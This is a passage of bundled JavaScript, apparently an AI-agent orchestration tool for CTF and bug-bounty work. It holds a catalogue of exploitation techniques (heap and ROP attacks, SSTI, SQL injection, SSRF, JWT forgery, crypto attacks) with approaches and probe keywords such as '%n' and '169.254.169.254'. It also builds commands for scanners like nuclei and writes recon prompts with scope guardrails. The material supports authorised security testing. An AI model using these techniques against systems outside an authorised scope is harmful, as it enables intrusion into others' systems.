    suggestedApproach: "Find exact offset with cyclic pattern, check mitigations (NX/PIE/canary), then pivot to ret2win/ret2libc/ROP based on protections.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["buffer overflow", "gets", "strcpy", "stack smash", "rip control", "eip", "overflow"]
  },
  {
    patternId: "format-string-leak",
    patternName: "Format String Leak/Write",
    confidence: "high",
    targetType: "PWN",
    description: "User input reaches printf-like sink without format control sanitization.",
    suggestedApproach: "Probe with %p/%x to leak stack/libc, determine argument index, then use %n for targeted writes if needed.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["format string", "printf", "%p", "%n", "%x", "vfprintf", "user controlled format"]
  },
  {
    patternId: "heap-tcache-poison",
    patternName: "Heap Tcache Poisoning",
    confidence: "high",
    targetType: "PWN",
    description: "Tcache freelist manipulation enables arbitrary chunk return.",
    suggestedApproach: "Check glibc version, leak heap/libc pointers, poison tcache next pointer, then allocate to overwrite hook/vtable target.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["tcache", "double free", "free list", "heap chunk", "glibc 2.27", "poison", "malloc"]
  },
  {
    patternId: "heap-uaf",
    patternName: "Heap Use-After-Free",
    confidence: "high",
    targetType: "PWN",
    description: "Freed chunk remains reachable through stale pointer path.",
    suggestedApproach: "Map object lifecycle, reclaim freed chunk with controlled data, then hijack function pointer/vtable or metadata for code execution.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["use after free", "uaf", "dangling pointer", "free then use", "heap object", "stale reference"]
  },
  {
    patternId: "ret2libc",
    patternName: "ret2libc",
    confidence: "high",
    targetType: "PWN",
    description: "Control flow hijack with NX enabled and libc symbols available via leak.",
    suggestedApproach: "Leak libc function address, compute libc base, resolve system and /bin/sh, then craft aligned ROP call chain.",
    suggestedTemplate: "ret2libc-outline",
    keywords: ["ret2libc", "libc leak", "got leak", "plt", "system", "/bin/sh", "nx enabled"]
  },
  {
    patternId: "rop-chain",
    patternName: "ROP Chain Construction",
    confidence: "high",
    targetType: "PWN",
    description: "No direct shellcode execution; chain gadgets to call useful functions/syscalls.",
    suggestedApproach: "Collect gadgets for argument registers and stack alignment, then chain leak stage and execution stage with deterministic constraints.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["rop", "gadget", "pop rdi", "ret gadget", "chain", "nx", "return oriented"]
  },
  {
    patternId: "srop",
    patternName: "Sigreturn-Oriented Programming",
    confidence: "medium",
    targetType: "PWN",
    description: "Signal frame forgery to control syscall context in limited gadget scenarios.",
    suggestedApproach: "Find syscall and sigreturn trigger, forge rt_sigreturn frame on stack, then set registers for execve/mprotect flow.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["srop", "sigreturn", "rt_sigreturn", "syscall; ret", "ucontext", "frame forgery"]
  },
  {
    patternId: "ret2dlresolve",
    patternName: "ret2dlresolve",
    confidence: "medium",
    targetType: "PWN",
    description: "Dynamic linker abuse to resolve symbols at runtime without direct libc leak.",
    suggestedApproach: "Craft fake relocation/symbol structures on writable memory, invoke plt resolver entry, resolve system and execute payload.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["ret2dlresolve", "dl-resolve", "linker", "plt0", "reloc", "dynsym", "dynstr"]
  },
  {
    patternId: "seccomp-bypass",
    patternName: "Seccomp Filter Bypass",
    confidence: "medium",
    targetType: "PWN",
    description: "Restricted syscalls require alternative primitives to get execution impact.",
    suggestedApproach: "Recover seccomp policy, choose allowed syscalls, then pivot to open/read/write or ORW-style chain instead of blocked execve.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["seccomp", "prctl", "sandbox", "syscall filter", "orw", "bpf"]
  },
  {
    patternId: "stack-pivot",
    patternName: "Stack Pivot",
    confidence: "medium",
    targetType: "PWN",
    description: "Limited overflow but controllable pointer allows moving stack to larger controlled region.",
    suggestedApproach: "Locate pivot gadget (leave; ret/xchg rsp), stage second ROP chain in writable buffer, then pivot and execute full chain.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["stack pivot", "leave; ret", "xchg rsp", "fake stack", "pivot", "bss chain"]
  },
  {
    patternId: "off-by-one",
    patternName: "Off-by-One Overflow",
    confidence: "medium",
    targetType: "PWN",
    description: "Single-byte overwrite corrupts metadata/size or saved frame state.",
    suggestedApproach: "Model exact boundary condition, target size byte/prev_inuse/canary LSB, and chain into controlled allocation or return path.",
    suggestedTemplate: "pwntools-skeleton",
    keywords: ["off by one", "null byte overflow", "size byte", "prev_inuse", "one byte overwrite", "boundary"]
  },
  {
    patternId: "ssti-jinja2",
    patternName: "SSTI in Jinja2",
    confidence: "high",
    targetType: "WEB_API",
    description: "Template expression input is rendered directly by Jinja2/Flask.",
    suggestedApproach: "Confirm expression evaluation with arithmetic payload, enumerate object graph safely, then escalate to file read/command execution proof.",
    keywords: ["ssti", "jinja2", "{{7*7}}", "render_template_string", "template injection", "flask"]
  },
  {
    patternId: "sqli-union",
    patternName: "Union-Based SQLi",
    confidence: "high",
    targetType: "WEB_API",
    description: "Query composition allows UNION SELECT data extraction.",
    suggestedApproach: "Identify injectable parameter, align column count/types, then extract schema and sensitive fields with minimal-impact payloads.",
    keywords: ["union select", "sql injection", "order by", "database error", "mysql", "postgres", "sqlite"]
  },
  {
    patternId: "sqli-blind",
    patternName: "Blind SQLi",
    confidence: "high",
    targetType: "WEB_API",
    description: "No direct SQL output but boolean/time side-channel present.",
    suggestedApproach: "Build deterministic boolean or time-based probes, then extract target data bitwise/charwise with retry and jitter control.",
    keywords: ["blind sqli", "time based", "sleep(", "boolean based", "if(", "pg_sleep", "benchmark("]
  },
  {
    patternId: "ssrf-basic",
    patternName: "SSRF",
    confidence: "high",
    targetType: "WEB_API",
    description: "Server fetches attacker-controlled URL and can reach internal resources.",
    suggestedApproach: "Validate outbound fetch, test localhost/metadata/internal hosts with safe probes, then demonstrate controlled internal access impact.",
    keywords: ["ssrf", "url fetch", "metadata", "169.254.169.254", "internal host", "webhook", "proxy"]
  },
  {
    patternId: "jwt-forgery",
    patternName: "JWT Forgery/Confusion",
    confidence: "high",
    targetType: "WEB_API",
    description: "JWT verification weakness (alg confusion/weak secret/kid abuse).",
    suggestedApproach: "Inspect token header/alg behavior, test none/HS-RS confusion where applicable, then prove privilege change with signed forgery.",
    keywords: ["jwt", "alg none", "hs256", "rs256", "kid", "jwk", "token forgery"]
  },
  {
    patternId: "deserialization",
    patternName: "Unsafe Deserialization",
    confidence: "medium",
    targetType: "WEB_API",
    description: "Untrusted serialized input reaches dangerous object constructors/gadgets.",
    suggestedApproach: "Identify serialization format and sink, craft minimal gadget payload for controlled side effect, then escalate impact carefully.",
    keywords: ["deserialization", "pickle", "java serialization", "ysoserial", "objectinputstream", "gadget chain"]
  },
  {
    patternId: "lfi-rfi",
    patternName: "LFI/RFI",
    confidence: "high",
    targetType: "WEB_API",
    description: "File include/read path is controllable and escapes intended directory.",
    suggestedApproach: "Probe traversal normalization, read benign target first, then prove sensitive file exposure or inclusion impact.",
    keywords: ["lfi", "rfi", "path traversal", "../", "php://filter", "include", "file read"]
  },
  {
    patternId: "xxe-injection",
    patternName: "XXE Injection",
    confidence: "medium",
    targetType: "WEB_API",
    description: "XML parser allows external entity expansion.",
    suggestedApproach: "Confirm external entity resolution with harmless entity, then demonstrate file read or SSRF through controlled DTD payload.",
    keywords: ["xxe", "doctype", "xml parser", "external entity", "dtd", "sax", "dom4j"]
  },
  {
    patternId: "race-condition",
    patternName: "Race Condition",
    confidence: "medium",
    targetType: "WEB_API",
    description: "Concurrent requests bypass state checks or consume shared resources unsafely.",
    suggestedApproach: "Locate check/use boundary, send synchronized concurrent requests, and verify inconsistent final state as reproducible impact.",
    keywords: ["race condition", "toctou", "concurrent request", "double spend", "parallel", "non-atomic"]
  },
  {
    patternId: "prototype-pollution",
    patternName: "Prototype Pollution",
    confidence: "medium",
    targetType: "WEB_API",
    description: "JavaScript object merge/path-set lets attacker control prototype properties.",
    suggestedApproach: "Test __proto__/constructor.prototype write paths, confirm polluted property propagation, then prove privilege/logic impact.",
    keywords: ["prototype pollution", "__proto__", "constructor.prototype", "lodash merge", "node", "polluted"]
  },
  {
    patternId: "web3-reentrancy",
    patternName: "WEB3 Reentrancy",
    confidence: "high",
    targetType: "WEB3",
    description: "State is updated after external call, allowing callback re-entry.",
    suggestedApproach: "Map call graph and storage writes, implement minimal attacker callback, then prove invariant break with deterministic tx sequence.",
    suggestedTemplate: "web3-reentrancy-checklist",
    keywords: ["reentrancy", "call.value", "external call", "fallback", "receive", "checks-effects-interactions"]
  },
  {
    patternId: "web3-access-control",
    patternName: "WEB3 Access Control Bypass",
    confidence: "high",
    targetType: "WEB3",
    description: "Privileged functions lack robust role/ownership validation.",
    suggestedApproach: "Trace modifier and role checks, test alternate code paths (proxy/delegatecall/init), then demonstrate unauthorized state change.",
    keywords: ["onlyowner", "access control", "role", "auth bypass", "delegatecall", "initializer"]
  },
  {
    patternId: "web3-oracle-manipulation",
    patternName: "WEB3 Oracle Manipulation",
    confidence: "high",
    targetType: "WEB3",
    description: "Protocol depends on manipulable price/feed source.",
    suggestedApproach: "Measure liquidity/cadence assumptions, simulate adverse price update, then verify liquidation/mint/burn math impact.",
    suggestedTemplate: "web3-oracle-manipulation",
    keywords: ["oracle", "twap", "price feed", "manipulation", "uniswap", "liquidation"]
  },
  {
    patternId: "web3-signature-replay",
    patternName: "WEB3 Signature Replay/Domain Confusion",
    confidence: "medium",
    targetType: "WEB3",
    description: "Signature validation omits nonce/chain/domain constraints.",
    suggestedApproach: "Inspect signed struct fields and domain separator usage, then test replay across chains/contracts/nonces.",
    keywords: ["eip712", "signature replay", "nonce", "domain separator", "permit", "chainid"]
  },
  {
    patternId: "web3-storage-collision",
    patternName: "WEB3 Proxy Storage Collision",
    confidence: "medium",
    targetType: "WEB3",
    description: "Proxy/implementation storage layout mismatch corrupts critical slots.",
    suggestedApproach: "Compare slot layouts across upgrades, locate overlapping admin/logic state, and prove controlled overwrite path.",
    keywords: ["proxy", "storage collision", "upgradeable", "uups", "transparent proxy", "slot"]
  },
  {
    patternId: "web3-flashloan-economics",
    patternName: "WEB3 Flashloan Economic Attack",
    confidence: "medium",
    targetType: "WEB3",
    description: "Protocol assumptions break under atomic large-capital manipulation.",
    suggestedApproach: "Model transaction atomicity and state checkpoints, simulate flashloan path, and compute profitability/feasibility bounds.",
    keywords: ["flashloan", "economic attack", "atomic", "defi", "sandwich", "price impact"]
  },
  {
    patternId: "misc-osint-pivot",
    patternName: "MISC OSINT Pivot",
    confidence: "medium",
    targetType: "MISC",
    description: "Challenge solution requires correlating weak public signals into a high-confidence lead.",
    suggestedApproach: "Collect source-cited clues, build timeline/entity map, and disconfirm top hypothesis before deep branching.",
    suggestedTemplate: "misc-osint-evidence-loop",
    keywords: ["osint", "timeline", "username pivot", "archive", "metadata", "citation"]
  },
  {
    patternId: "misc-encoding-chain",
    patternName: "MISC Multi-Stage Encoding",
    confidence: "medium",
    targetType: "MISC",
    description: "Artifact uses layered encodings/compressions causing misleading partial outputs.",
    suggestedApproach: "Detect encode/decode layers iteratively, validate each layer checksum/structure, and avoid lossy transforms.",
    keywords: ["base64", "hex", "rot", "gzip", "xor", "multi-stage"]
  },
  {
    patternId: "misc-logic-constraint",
    patternName: "MISC Logic/Constraint Puzzle",
    confidence: "medium",
    targetType: "MISC",
    description: "Puzzle is solvable via explicit constraints rather than brute-force search.",
    suggestedApproach: "Formalize rules as constraints, solve with SAT/SMT or guided search, and verify solution against original checker.",
    keywords: ["logic puzzle", "constraint", "sat", "smt", "state search", "invariant"]
  },
  {
    patternId: "rsa-small-e",
    patternName: "RSA Small Exponent",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Low exponent with weak padding/no padding enables direct root or broadcast attacks.",
    suggestedApproach: "Check padding mode and message bounds, then apply integer root or Hastad-style recovery with verifiable small test vectors.",
    keywords: ["rsa", "small e", "e=3", "hastad", "no padding", "integer root", "broadcast"]
  },
  {
    patternId: "rsa-common-modulus",
    patternName: "RSA Common Modulus",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Same modulus reused with different coprime exponents.",
    suggestedApproach: "Verify same N and gcd(e1,e2)=1, apply extended Euclid on exponents, combine ciphertext powers to recover plaintext.",
    keywords: ["common modulus", "same n", "rsa", "extended euclid", "coprime exponents", "bezout"]
  },
  {
    patternId: "rsa-wiener",
    patternName: "RSA Wiener Attack",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Private exponent d too small and recoverable via continued fractions.",
    suggestedApproach: "Test Wiener conditions quickly, run continued fraction convergents, then verify recovered key by encryption/decryption round trip.",
    keywords: ["wiener", "continued fraction", "small d", "rsa weak key", "convergent", "private exponent"]
  },
  {
    patternId: "aes-ecb-oracle",
    patternName: "AES ECB Oracle",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Deterministic ECB encryption oracle leaks plaintext structure/bytes.",
    suggestedApproach: "Confirm ECB block repetition, derive block size, then perform byte-at-a-time dictionary attack with alignment control.",
    suggestedTemplate: "ecb-byte-at-a-time",
    keywords: ["aes ecb", "oracle", "byte at a time", "deterministic block", "repeated blocks", "chosen plaintext"]
  },
  {
    patternId: "aes-cbc-bitflip",
    patternName: "AES CBC Bit-Flipping",
    confidence: "high",
    targetType: "CRYPTO",
    description: "CBC malleability permits controlled plaintext change without key knowledge.",
    suggestedApproach: "Locate target plaintext block, compute xor delta against previous ciphertext block, then verify privilege field flip.",
    keywords: ["cbc bitflip", "aes cbc", "malleability", "iv manipulation", "xor delta", "admin=true"]
  },
  {
    patternId: "padding-oracle",
    patternName: "CBC Padding Oracle",
    confidence: "high",
    targetType: "CRYPTO",
    description: "Padding validity side-channel allows plaintext recovery/forgery.",
    suggestedApproach: "Stabilize oracle signal, recover plaintext bytewise from tail, then optionally forge valid ciphertext for target message.",
    suggestedTemplate: "padding-oracle-loop",
    keywords: ["padding oracle", "pkcs7", "cbc", "invalid padding", "oracle", "bytewise decryption"]
  },
  {
    patternId: "hash-length-extension",
    patternName: "Hash Length Extension",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "MAC built as hash(secret || message) on Merkle-Damgard hash is forgeable.",
    suggestedApproach: "Identify vulnerable construction and hash family, brute-force key length candidates, then append controlled suffix with valid MAC.",
    keywords: ["length extension", "sha1", "md5", "secret prefix", "merkle damgard", "mac forgery"]
  },
  {
    patternId: "discrete-log",
    patternName: "Discrete Log Weak Parameters",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Group parameters permit tractable DLP solution (small subgroup/smooth order).",
    suggestedApproach: "Factor group order where possible, use baby-step giant-step or Pohlig-Hellman, then verify secret reconstruction.",
    keywords: ["discrete log", "dh", "pohlig hellman", "baby-step giant-step", "smooth order", "small subgroup"]
  },
  {
    patternId: "xor-known-plaintext",
    patternName: "XOR Known-Plaintext",
    confidence: "high",
    targetType: "CRYPTO",
    description: "XOR keystream reused or partially known allowing key recovery.",
    suggestedApproach: "Use known plaintext crib to recover keystream segment, extend by consistency checks, and decrypt remaining ciphertext.",
    keywords: ["xor", "known plaintext", "crib", "reused key", "one time pad reuse", "keystream"]
  },
  {
    patternId: "mt19937-predict",
    patternName: "MT19937 State Prediction",
    confidence: "medium",
    targetType: "CRYPTO",
    description: "Enough PRNG outputs leak internal MT19937 state and future outputs.",
    suggestedApproach: "Collect sufficient outputs, untemper to reconstruct state, then predict future values or recover seed path.",
    keywords: ["mt19937", "mersenne twister", "untemper", "prng", "predict output", "seed recovery"]
  },
  {
    patternId: "anti-debug",
    patternName: "Anti-Debug Techniques",
    confidence: "medium",
    targetType: "REV",
    description: "Binary actively detects debugger/instrumentation to alter control flow.",
    suggestedApproach: "Identify anti-debug checks (ptrace/timing/self-check), patch or emulate bypass, then re-run with parity artifacts.",
    keywords: ["anti debug", "ptrace", "isdebuggerpresent", "timing check", "debug detect", "self check"]
  },
  {
    patternId: "vm-obfuscation",
    patternName: "VM-Based Obfuscation",
    confidence: "medium",
    targetType: "REV",
    description: "Custom bytecode VM hides core logic behind dispatcher and handlers.",
    suggestedApproach: "Locate VM loop and handler table, lift bytecode semantics, then solve/check constraints from reconstructed VM instructions.",
    keywords: ["vm", "bytecode", "dispatcher", "handler", "virtual machine", "obfuscation"]
  },
  {
    patternId: "angr-solvable",
    patternName: "Angr-Solvable Constraint Path",
    confidence: "medium",
    targetType: "REV",
    description: "Program path conditions are suitable for symbolic execution.",
    suggestedApproach: "Isolate win/lose addresses, model input bytes as symbolic vars, constrain bad paths away, and solve for accepted input.",
    keywords: ["angr", "symbolic execution", "find avoid", "path constraints", "claripy", "solve input"]
  },
  {
    patternId: "z3-constraints",
    patternName: "Z3 Constraint Solving",
    confidence: "high",
    targetType: "REV",
    description: "Validation logic is arithmetic/bitwise constraints directly translatable to SMT.",
    suggestedApproach: "Extract exact constraints from decompilation, encode as bit-vectors in z3, solve, and validate candidate on original binary.",
    keywords: ["z3", "constraints", "bit vector", "smt", "equation", "symbolic solver"]
  },
  {
    patternId: "self-modifying-code",
    patternName: "Self-Modifying Code",
    confidence: "medium",
    targetType: "REV",
    description: "Runtime code/data mutation invalidates naive static analysis assumptions.",
    suggestedApproach: "Trace runtime writes to executable/validation regions, dump post-decryption stages, and analyze stabilized code snapshot.",
    keywords: ["self modifying", "runtime patch", "unpack", "decrypt code", "jit", "write xor execute"]
  },
  {
    patternId: "steganography-lsb",
    patternName: "Steganography LSB",
    confidence: "high",
    targetType: "FORENSICS",
    description: "Payload hidden in image/audio least-significant bits or channel ordering.",
    suggestedApproach: "Inspect metadata and channels, extract LSB planes with multiple bit orders, then validate decoded payload structure.",
    keywords: ["steganography", "lsb", "steg", "png", "bitmap", "hidden message", "channels"]
  },
  {
    patternId: "pcap-extraction",
    patternName: "PCAP Stream Extraction",
    confidence: "high",
    targetType: "FORENSICS",
    description: "Key evidence/flag resides in network capture streams or transferred files.",
    suggestedApproach: "Identify suspicious protocols/hosts, reconstruct streams/files, then carve/decode transferred artifacts for final evidence.",
    keywords: ["pcap", "wireshark", "tcp stream", "http objects", "dns exfil", "packet capture"]
  },
  {
    patternId: "memory-dump",
    patternName: "Memory Dump Analysis",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Secrets/process traces recoverable from volatile memory snapshot.",
    suggestedApproach: "Profile memory image, enumerate processes/connections, extract credentials/command history/artifacts, and cross-check timeline.",
    keywords: ["memory dump", "volatility", "ram", "process list", "lsass", "mem image"]
  },
  {
    patternId: "disk-image",
    patternName: "Disk Image Timeline",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Filesystem artifacts in raw disk image reveal deleted/hidden data.",
    suggestedApproach: "Mount image read-only, inspect partitions/filesystems, recover deleted entries, and build timeline from metadata.",
    keywords: ["disk image", "forensic image", "partition", "mft", "ext4", "deleted files", "timeline"]
  },
  {
    patternId: "file-carving",
    patternName: "File Carving",
    confidence: "medium",
    targetType: "FORENSICS",
    description: "Embedded payload exists in unallocated/slack or concatenated binary blobs.",
    suggestedApproach: "Locate magic bytes and boundaries, carve candidate files, then validate headers/checksums and recurse into nested containers.",
    keywords: ["file carving", "magic bytes", "binwalk", "foremost", "slack space", "embedded file"]
  }
];
var CONFIDENCE_RANK = {
  low: 1,
  medium: 2,
  high: 3
};
function normalize(value) {
  return value.trim().toLowerCase().replace(/\s+/g, " ");
}
function toTokenSet(text) {
  const parts = text.split(/[^a-z0-9_+./%-]+/i).map((p) => p.trim().toLowerCase()).filter((p) => p.length > 0);
  return new Set(parts);
}
function keywordMatched(normalizedText, tokens, keyword) {
  const normalizedKeyword = normalize(keyword);
  if (!normalizedKeyword) {
    return false;
  }
  if (normalizedKeyword.length <= 3) {
    return tokens.has(normalizedKeyword);
  }
  if (normalizedKeyword.includes(" ") || normalizedKeyword.includes("-") || normalizedKeyword.includes("/")) {
    return normalizedText.includes(normalizedKeyword);
  }
  return tokens.has(normalizedKeyword) || normalizedText.includes(normalizedKeyword);
}
function mergeConfidence(baseline, hits, totalKeywords) {
  if (totalKeywords <= 0) {
    return baseline;
  }
  const ratio = hits / totalKeywords;
  const derived = ratio >= 0.6 ? "high" : ratio >= 0.35 ? "medium" : "low";
  return CONFIDENCE_RANK[derived] > CONFIDENCE_RANK[baseline] ? derived : baseline;
}
function matchPatterns(text, targetType) {
  const normalizedText = normalize(text ?? "");
  if (!normalizedText) {
    return [];
  }
  const tokens = toTokenSet(normalizedText);
  const scoredMatches = KNOWN_PATTERNS.filter((pattern) => targetType ? pattern.targetType === targetType : true).map((pattern) => {
    const validKeywords = pattern.keywords.map(normalize).filter((keyword) => keyword.length > 0);
    const hits = validKeywords.filter((keyword) => keywordMatched(normalizedText, tokens, keyword));
    const phraseHit = hits.some((keyword) => keyword.includes(" ") || keyword.includes("-") || keyword.includes("/"));
    const hitCount = hits.length;
    const ratio = validKeywords.length > 0 ? hitCount / validKeywords.length : 0;
    const shouldInclude = hitCount >= 2 || ratio >= 0.34 || phraseHit;
    if (!shouldInclude) {
      return null;
    }
    const score = hitCount * 10 + Math.round(ratio * 100);
    return {
      pattern: {
        ...pattern,
        confidence: mergeConfidence(pattern.confidence, hitCount, validKeywords.length)
      },
      score
    };
  }).filter((entry) => entry !== null);
  return scoredMatches.sort((a, b) => {
    const confDiff = CONFIDENCE_RANK[b.pattern.confidence] - CONFIDENCE_RANK[a.pattern.confidence];
    if (confDiff !== 0) {
      return confDiff;
    }
    if (b.score !== a.score) {
      return b.score - a.score;
    }
    return a.pattern.patternId.localeCompare(b.pattern.patternId);
  }).map((entry) => entry.pattern);
}
function buildPatternSummary(matches) {
  if (!matches || matches.length === 0) {
    return "No strong known CTF pattern matches found. Continue SCAN with 2-4 hypotheses and cheapest disconfirm tests.";
  }
  const lines = [
    `Known pattern matches: ${matches.length}`,
    "Use highest-confidence items first and run the cheapest disconfirm test before deep execution."
  ];
  for (const match of matches) {
    const templatePart = match.suggestedTemplate ? ` | template=${match.suggestedTemplate}` : "";
    lines.push(`- [${match.confidence}] ${match.patternName} (${match.patternId}, ${match.targetType})${templatePart}`, `  approach: ${match.suggestedApproach}`, `  keywords: ${match.keywords.join(", ")}`);
  }
  return lines.join(`
`);
}

// src/orchestration/tool-integration.ts
var DEFAULT_NUCLEI_RATE_LIMIT = 50;
var MIN_NUCLEI_RATE_LIMIT = 1;
var MAX_NUCLEI_RATE_LIMIT = 200;
var MIN_ROP_DEPTH = 1;
var MAX_ROP_DEPTH = 40;
function shellQuote2(value) {
  return `'${value.replace(/'/g, `'"'"'`)}'`;
}
function clamp(value, min, max) {
  if (!Number.isFinite(value)) {
    return min;
  }
  return Math.min(max, Math.max(min, Math.trunc(value)));
}
function uniqStrings(values) {
  return Array.from(new Set(values));
}
function checksecCommand(binaryPath) {
  return {
    tool: "checksec",
    command: `checksec --file=${shellQuote2(binaryPath)}`,
    purpose: "Inspect binary hardening protections",
    outputParser: "parseChecksecOutput"
  };
}
function ropgadgetCommand(binaryPath, options) {
  const parts = ["ROPgadget", `--binary ${shellQuote2(binaryPath)}`];
  if (typeof options?.depth === "number") {
    parts.push(`--depth ${clamp(options.depth, MIN_ROP_DEPTH, MAX_ROP_DEPTH)}`);
  }
  const filter = options?.filter?.trim();
  if (filter) {
    parts.push(`--only ${shellQuote2(filter)}`);
  }
  return {
    tool: "ROPgadget",
    command: parts.join(" "),
    purpose: "Discover usable ROP gadgets",
    outputParser: "ropgadget_summary_regex"
  };
}
function oneGadgetCommand(libcPath) {
  return {
    tool: "one_gadget",
    command: `one_gadget --raw ${shellQuote2(libcPath)}`,
    purpose: "Enumerate one-shot libc gadget offsets",
    outputParser: "one_gadget_offset_regex"
  };
}
function binwalkCommand(filePath, extract = false) {
  return {
    tool: "binwalk",
    command: `binwalk${extract ? " -e" : ""} ${shellQuote2(filePath)}`,
    purpose: extract ? "Scan and extract embedded data" : "Scan for embedded file signatures",
    outputParser: "binwalk_signature_regex"
  };
}
function exiftoolCommand(filePath) {
  return {
    tool: "exiftool",
    command: `exiftool ${shellQuote2(filePath)}`,
    purpose: "Extract artifact metadata",
    outputParser: "exif_key_value_regex"
  };
}
function nucleiCommand(target, options) {
  const rateLimit = clamp(options?.rateLimit ?? DEFAULT_NUCLEI_RATE_LIMIT, MIN_NUCLEI_RATE_LIMIT, MAX_NUCLEI_RATE_LIMIT);
  const parts = [
    "nuclei",
    `-u ${shellQuote2(target)}`,
    "-silent",
    "-no-color",
    `-rate-limit ${rateLimit}`
  ];
  const templates = options?.templates?.trim();
  if (templates) {
    parts.push(`-t ${shellQuote2(templates)}`);
  }
  const severity = uniqStrings((options?.severity ?? "").split(",").map((item) => item.trim().toLowerCase()).filter((item) => /^(info|low|medium|high|critical|unknown)$/.test(item))).join(",");
  if (severity) {
    parts.push(`-severity ${shellQuote2(severity)}`);
  }
  return {
    tool: "nuclei",
    command: parts.join(" "),
    purpose: "Run template vulnerability checks with safety bounds",
    outputParser: "nuclei_finding_regex"
  };
}
function rsactftoolCommand(options) {
  const parts = ["RsaCtfTool", "--private"];
  const publicKey = options.publicKey?.trim();
  if (publicKey) {
    parts.push(`--publickey ${shellQuote2(publicKey)}`);
  } else {
    const n = options.n?.trim();
    const e = options.e?.trim();
    const c = options.c?.trim();
    if (n) {
      parts.push(`--n ${shellQuote2(n)}`);
    }
    if (e) {
      parts.push(`--e ${shellQuote2(e)}`);
    }
    if (c) {
      parts.push(`--uncipher ${shellQuote2(c)}`);
    }
  }
  if (parts.length === 2) {
    parts.push("--help");
  }
  return {
    tool: "RsaCtfTool",
    command: parts.join(" "),
    purpose: "Attempt RSA key recovery/decryption",
    outputParser: "rsactftool_key_material_regex"
  };
}
function patchelfCommand(binaryPath, libcPath, ldPath) {
  const steps = [];
  const cleanLdPath = ldPath?.trim();
  if (cleanLdPath) {
    steps.push(`patchelf --set-interpreter ${shellQuote2(cleanLdPath)} ${shellQuote2(binaryPath)}`);
  }
  steps.push(`patchelf --replace-needed libc.so.6 ${shellQuote2(libcPath)} ${shellQuote2(binaryPath)}`);
  return {
    tool: "patchelf",
    command: steps.join(" && "),
    purpose: "Patch binary to match remote libc/loader",
    outputParser: "patchelf_exit_status"
  };
}
function recommendedTools(targetType) {
  switch (targetType) {
    case "PWN":
      return [
        checksecCommand("<binary>"),
        ropgadgetCommand("<binary>", { depth: 12, filter: "pop|ret|syscall" }),
        oneGadgetCommand("<libc.so.6>"),
        patchelfCommand("<binary>", "<libc.so.6>", "<ld-linux-x86-64.so.2>")
      ];
    case "REV":
      return [checksecCommand("<binary>"), binwalkCommand("<artifact>", true), exiftoolCommand("<artifact>")];
    case "FORENSICS":
      return [binwalkCommand("<image_or_dump>", true), exiftoolCommand("<image_or_media>")];
    case "CRYPTO":
      return [
        rsactftoolCommand({ n: "<n>", e: "<e>", c: "<ciphertext>" }),
        {
          tool: "z3",
          command: "python3 solve.py",
          purpose: "Run symbolic solver constraints",
          outputParser: "z3_sat_unsat_regex"
        }
      ];
    case "WEB_API":
    case "WEB3":
      return [nucleiCommand("<target>", { rateLimit: DEFAULT_NUCLEI_RATE_LIMIT })];
    case "MISC":
    case "UNKNOWN":
    default:
      return [binwalkCommand("<target>"), exiftoolCommand("<target>")];
  }
}

// src/orchestration/recon-pipeline.ts
function normalizeScope(scope, fallbackTarget) {
  const cleaned = (scope ?? []).map((item) => item.trim()).filter(Boolean);
  if (cleaned.length > 0) {
    return cleaned;
  }
  return [fallbackTarget.trim() || "<target>"];
}
function buildGuardrailBlock(target, scope, scopeConfirmed) {
  const inScope = normalizeScope(scope, target);
  return [
    "Scope constraints:",
    `- In-scope assets only: ${inScope.join(", ")}`,
    scopeConfirmed ? "- Scope status: confirmed; still avoid out-of-scope pivots." : "- Scope status: unconfirmed; keep actions conservative and scope-safe.",
    "- Do not test third-party or unknown assets.",
    "Rate limiting reminders:",
    "- Use low request rates and small batches.",
    "- Back off immediately on 429/5xx spikes or instability."
  ].join(`
`);
}
function withGuardrails(prompt, target, scope, scopeConfirmed) {
  return `${prompt}

${buildGuardrailBlock(target, scope, scopeConfirmed)}`;
}
function planAssetDiscovery(target, scope) {
  const tracks = [
    {
      purpose: "asset-discovery-subdomains",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 1: Asset Discovery]`,
        `Target: ${target}`,
        "Enumerate candidate subdomains with passive-first methods and deduplicate results.",
        "Output should include: discovered assets, confidence, and one safest next recon step."
      ].join(`
`), target, scope)
    },
    {
      purpose: "asset-discovery-ports",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 1: Asset Discovery]`,
        `Target: ${target}`,
        "Perform conservative host/port triage on confirmed in-scope hosts.",
        "Prioritize lightweight checks and summarize live services by risk relevance."
      ].join(`
`), target, scope)
    }
  ];
  return {
    phase: 1,
    name: "Asset Discovery",
    tracks
  };
}
function planLiveHostTriage(target) {
  const tracks = [
    {
      purpose: "live-host-http-probing",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 2: Live Host Triage]`,
        `Target: ${target}`,
        "Probe candidate hosts for live HTTP(S) services and prioritize reachable assets.",
        "Capture status code clusters, titles, and high-value endpoints only."
      ].join(`
`), target)
    },
    {
      purpose: "live-host-tech-detection",
      agent: "bounty-triage",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 2: Live Host Triage]`,
        `Target: ${target}`,
        "Fingerprint technologies/frameworks with low-impact techniques.",
        "Map likely attack surface categories without active exploitation."
      ].join(`
`), target)
    }
  ];
  return {
    phase: 2,
    name: "Live Host Triage",
    tracks
  };
}
function planContentDiscovery(target) {
  const tracks = [
    {
      purpose: "content-discovery-crawl",
      agent: "bounty-research",
      prompt: withGuardrails([
        `[BOUNTY Recon Phase 3: Content Discovery]`,
        `Target: ${target}`,
        "Crawl known live hosts to discover endpoints, parameters, and API paths.",
